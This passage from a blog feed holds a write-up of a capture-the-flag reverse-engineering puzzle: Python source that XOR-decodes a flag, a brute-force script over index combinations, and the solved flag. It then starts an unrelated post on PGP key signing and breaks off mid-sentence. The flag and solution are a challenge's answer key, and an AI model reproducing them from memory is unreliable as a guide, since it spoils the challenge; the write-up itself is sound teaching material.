&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;myGame&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;xdim&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ydim&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;xdim&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ydim&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;make_keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;words&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wordlist.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;words&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;words&lt;/span&gt;&lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

        &lt;span class="n"&gt;keyArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="n"&gt;keyArray&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]][&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
        &lt;span class="n"&gt;keyArray&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]][&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;keyArray&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;NSYDUhoVWQ8SQVcOAAYRFQkORA4FQVMDQQ5fQhUEWUYMDl4MHA==&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;))))&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; ^ &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; = &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mgame&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;myGame&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;x1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;y1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;make_keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;My take from it was that the programs takes four inputs and uses them for creating a key based on a matrix and on the wordlist. If the resulting key is the correct one, the &lt;code&gt;checkdata&lt;/code&gt; function is going to print out the flag.&lt;/p&gt;
&lt;p&gt;Running the program confirmed my theory&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;python&lt;span class="w"&gt; &lt;/span&gt;keygame.py
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
aa0caa0c
&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;RYAW&lt;span class="w"&gt;   &lt;/span&gt;DASA_BYF
&lt;span class="w"&gt;                           &lt;/span&gt;^
&lt;span class="w"&gt;                             &lt;/span&gt;^&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;aa0caa0c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;TG31&lt;span class="o"&gt;{&lt;/span&gt;tils&lt;span class="w"&gt; &lt;/span&gt;gmag!vhotmd&lt;span class="w"&gt; &lt;/span&gt;c&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;oo!tei%mono&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now, how to figure out what are the correct inputs? The sources shows that the game is created with a 25x25 matrix (&lt;code&gt;mgame = myGame(25, 25)&lt;/code&gt;) and since the inputs are used as indexes for the matrix, any input greater than 24 should be invalid.&lt;/p&gt;
&lt;p&gt;A quick run of the program confirmed this theory as well&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;python&lt;span class="w"&gt; &lt;/span&gt;keygame.py
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
input&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;number:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;
Traceback&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;most&lt;span class="w"&gt; &lt;/span&gt;recent&lt;span class="w"&gt; &lt;/span&gt;call&lt;span class="w"&gt; &lt;/span&gt;last&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;keygame.py&amp;quot;&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;56&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;module&amp;gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;mgame.make_keys&lt;span class="o"&gt;(&lt;/span&gt;int&lt;span class="o"&gt;(&lt;/span&gt;x&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;int&lt;span class="o"&gt;(&lt;/span&gt;y&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;int&lt;span class="o"&gt;(&lt;/span&gt;x1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;int&lt;span class="o"&gt;(&lt;/span&gt;y1&lt;span class="o"&gt;))&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;File&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;keygame.py&amp;quot;&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;line&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;34&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;make_keys
&lt;span class="w"&gt;    &lt;/span&gt;keyArray.append&lt;span class="o"&gt;(&lt;/span&gt;self.matrix&lt;span class="o"&gt;[&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]][&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]])&lt;/span&gt;
IndexError:&lt;span class="w"&gt; &lt;/span&gt;list&lt;span class="w"&gt; &lt;/span&gt;index&lt;span class="w"&gt; &lt;/span&gt;out&lt;span class="w"&gt; &lt;/span&gt;of&lt;span class="w"&gt; &lt;/span&gt;range
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So, I needed a way to test all the possible combinations of four inputs ranging from 0 to 24 and it turned out that python has a built-in way for doing just that. Enter &lt;code&gt;itertools.products&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keygame&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;myGame&lt;/span&gt;

&lt;span class="n"&gt;inputs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="n"&gt;possibilities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;itertools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;product&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;inputs&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

&lt;span class="n"&gt;mgame&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;myGame&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;possibilities&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;make_keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TG20{&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I commented out the &lt;code&gt;print&lt;/code&gt; statements from keygame.py to reduce the noise, and then waited for my script to spit out the flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39;TG20{this flag should be on teh moon}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="reverse"></category></entry><entry><title>How to sign PGP keys with an offline master key</title><link href="https://railslide.io/how-to-sign-pgp-keys-with-offline-master-key.html" rel="alternate"></link><published>2017-06-03T00:00:00+02:00</published><updated>2017-06-03T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2017-06-03:/how-to-sign-pgp-keys-with-offline-master-key.html</id><summary type="html">&lt;p&gt;Signing other people keys with an offline master key is not super straightforward. Here's how to do it in an almost pain-free way.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Lately I wanted to sign a coworker's key, so after having gone through the all in-real-life verification shebang together, all that was left was me performing the actual signing. However, since I &lt;a href="https://railslide.io/create-gpg-key-with-subkeys.html"&gt;use subkeys on my laptop&lt;/a&gt;, I first needed to get out my master key from its secret dungeon and tell GPG to use that one instead of the usual 